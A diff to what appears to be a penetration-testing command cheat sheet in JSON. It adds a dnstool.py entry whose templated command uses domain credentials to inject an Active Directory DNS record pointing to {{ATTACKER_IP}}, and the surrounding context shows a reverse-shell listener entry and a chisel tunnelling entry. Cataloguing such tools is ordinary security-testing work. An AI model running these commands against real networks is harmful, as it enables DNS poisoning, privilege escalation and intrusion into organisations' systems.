@@ -314,6 +314,16 @@
       { "desc": "Add listener (reverse shell)", "cmd": "listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444" }
     ]
   },
+{
+  "tool": "dnstool.py",
+  "tags": ["AD", "DNS", "LDAP", "record", "privesc"],
+  "commands": [
+    {
+      "desc": "Add DNS record",
+      "cmd": "dnstool.py -u '{{DOMAIN}}\\{{USER}}' -p '{{PASS}}' -a add -r {{RECORD}} -d {{ATTACKER_IP}} {{IP}}"
+    }
+  ]
+},
   {
     "tool": "chisel",
     "tags": ["pivot", "tunnel", "proxy", "socks", "port-forward"],
